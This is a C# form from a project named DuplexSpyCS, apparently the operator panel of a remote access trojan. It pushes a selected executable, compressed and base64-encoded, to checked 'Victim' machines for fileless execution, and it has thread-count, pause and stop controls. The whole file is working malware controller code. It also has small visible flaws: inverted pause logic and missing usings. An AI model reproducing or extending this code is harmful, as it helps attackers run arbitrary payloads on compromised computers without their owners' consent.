using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFilelessExec : Form
    {
        public List<Victim> m_lsVictim;

        private bool m_bSignalPause { get; set; }
        private bool m_bSignalStop { get; set; }

        public frmFilelessExec()
        {
            InitializeComponent();
        }

        void fnSendPayload(string[] alpArgs, int nThdCnt, byte[] abData)
        {
            List<Victim> lsTarget = new List<Victim>();
            Invoke(new Action(() =>
            {
                lsTarget.AddRange(
                    listView1.CheckedItems.Cast<ListViewItem>()
                    .Where(x => x.Checked)
                    .Select(x => (Victim)x.Tag)
                    .ToList()
                    );
                toolStripStatusLabel2.Text = "Running";
            }));

            string szArgs = string.Join(",", alpArgs.Select(x => Crypto.b64E2Str(x)).ToArray());
            string szData = Convert.ToBase64String(abData);

            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(nThdCnt, nThdCnt);
            foreach (Victim v in lsTarget)
            {
                while (m_bSignalPause)
                {
                    Invoke(new Action(() => toolStripStatusLabel2.Text = "Pause"));
                    Thread.Sleep(1000);
                }

                if (m_bSignalStop)
                {
                    Invoke(new Action(() => toolStripStatusLabel2.Text = "Stopped"));
                    break;
                }

                ThreadPool.QueueUserWorkItem(x => v.SendCommand($"fle|{szArgs}|{szData}"));
            }
        }

        void fnSetup()
        {
            //Controls
            listView1.FullRowSelect = true;
            listView1.CheckBoxes = true;
            toolStripStatusLabel1.Text = $"Target[{m_lsVictim.Count}]";
            toolStripStatusLabel2.Text = string.Empty;
            radioButton1.Checked = true;

            //setup
            foreach (Victim v in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(v.ID);
                item.SubItems.Add("?");
                item.Tag = v;

                listView1.Items.Add(item);
            }
        }

        private void frmFilelessExec_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Open exe.
        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Executable (*.exe)|*.exe";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }
        //Check all.
        private void button2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck all.
        private void button3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }
        //Go
        private void button4_Click(object sender, EventArgs e)
        {
            m_bSignalPause = false;
            m_bSignalStop = false;

            string szFileName = textBox1.Text;
            string szArgs = textBox2.Text;

            if (!File.Exists(szFileName))
            {
                MessageBox.Show("File not found: " + szFileName, "FileNotExists", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int nThdCnt = (int)numericUpDown1.Value;
            string[] alpArgs = szArgs.Split(' ');
            byte[] abData = File.ReadAllBytes(szFileName);
            abData = C1.Compress(abData);

            new Thread(() => fnSendPayload(alpArgs, nThdCnt, abData)).Start();
        }
        //Pause
        private void button6_Click(object sender, EventArgs e)
        {
            if (button6.Text == "Pause")
            {
                m_bSignalPause = false;
                toolStripStatusLabel2.Text = "Running";
                button6.Text = "Resume";
            }
            else
            {
                m_bSignalPause = true;
                toolStripStatusLabel2.Text = "Pause";
                button6.Text = "Pause";
            }
        }
        //Stop
        private void button5_Click(object sender, EventArgs e)
        {
            m_bSignalStop = true;
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            groupBox1.Enabled = radioButton1.Checked;
        }
    }
}
